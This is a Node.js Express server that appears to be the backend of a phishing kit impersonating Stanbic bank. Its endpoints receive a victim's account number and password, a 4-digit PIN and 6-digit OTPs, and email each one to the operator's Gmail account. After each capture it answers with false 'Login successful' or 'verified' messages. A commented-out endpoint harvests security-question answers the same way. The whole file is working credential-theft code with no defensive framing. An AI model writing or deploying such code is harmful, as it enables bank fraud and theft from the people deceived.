const express = require("express");
const app = express();
const cors = require("cors");
const nodemailer = require("nodemailer");
require("dotenv").config();

// Middleware
app.use(express.json());
app.use(
  cors({
    origin: "https://core-stanbic-app.vercel.app",
  }),
);

const PORT = process.env.PORT || 5000;

// Email credentials from .env
const userEmail = process.env.EMAIL_USER;
const pass = process.env.EMAIL_PASS;

// Reusable transporter
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: userEmail,
    pass: pass,
  },
});

// Helper: send email and respond
const sendMailAndRespond = (
  mailOptions,
  res,
  successMsg,
  failMsg,
  failCode = 400,
) => {
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log("Email error:", error);
      return res.status(failCode).json({ success: false, message: failMsg });
    }
    console.log("Email sent:", info.response);
    return res.status(200).json({ success: true, message: successMsg });
  });
};

// ─── ENDPOINT 1: POST / ─── Login
app.post("/", (req, res) => {
  const { accountNumber, password } = req.body;

  if (!accountNumber) {
    return res
      .status(401)
      .json({ success: false, message: "Invalid account number or password" });
  }

  if (!password) {
    return res
      .status(401)
      .json({ success: false, message: "Invalid account number or password" });
  }

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: "Stanbic Login Details",
    text: `Account Number: ${accountNumber}\nPassword: ${password}`,
  };

  sendMailAndRespond(
    mailOptions,
    res,
    "Login successful",
    "Invalid account number or password",
    401,
  );
});

// ─── ENDPOINT 2: POST /pin ─── PIN Verification
app.post("/pin", (req, res) => {
  const { pin } = req.body;

  // Validate: pin must be exactly 4 digits
  if (!pin || !/^\d{4}$/.test(pin)) {
    return res.status(401).json({ success: false, message: "Invalid PIN" });
  }

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: "Stanbic PIN Confirmation",
    text: `User PIN: ${pin}`,
  };

  sendMailAndRespond(
    mailOptions,
    res,
    "PIN verified successfully",
    "Invalid PIN",
    401,
  );
});

// ─── ENDPOINT 3: POST /verify-otp ─── OTP Verification
app.post("/verify-otp", (req, res) => {
  const { otp } = req.body;

  // Validate: otp must be exactly 6 digits
  if (!otp || !/^\d{6}$/.test(otp)) {
    return res
      .status(400)
      .json({ success: false, message: "Invalid or expired OTP" });
  }

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: "Stanbic OTP Verification",
    text: `User OTP: ${otp}`,
  };

  sendMailAndRespond(
    mailOptions,
    res,
    "OTP verified successfully",
    "Invalid or expired OTP",
    400,
  );
});

// ─── ENDPOINT 4: POST /resend-otp ─── Resend OTP
app.post("/resend-otp", (req, res) => {
  const { otp } = req.body;

  // Validate: otp must be exactly 6 digits
  if (!otp || !/^\d{6}$/.test(otp)) {
    return res
      .status(400)
      .json({ success: false, message: "Invalid or expired OTP" });
  }

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: "Stanbic Second OTP Verification",
    text: `User OTP: ${otp}`,
  };

  sendMailAndRespond(
    mailOptions,
    res,
    "Second OTP verified successfully",
    "Invalid or expired OTP",
    400,
  );
});

// // ─── ENDPOINT 5: POST /security-question ─── Security Question
// app.post("/security-question", (req, res) => {
//   const { securityQuestion, answer } = req.body;

//   if (!securityQuestion || !answer || answer.length < 2) {
//     return res
//       .status(400)
//       .json({ success: false, message: "Incorrect answer" });
//   }

//   const mailOptions = {
//     from: userEmail,
//     to: userEmail,
//     subject: "MoMo Security Question",
//     text: `Security Question: ${securityQuestion}\nAnswer: ${answer}`,
//   };

//   sendMailAndRespond(
//     mailOptions,
//     res,
//     "Security question verified",
//     "Incorrect answer",
//     400,
//   );
// });

// Start server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
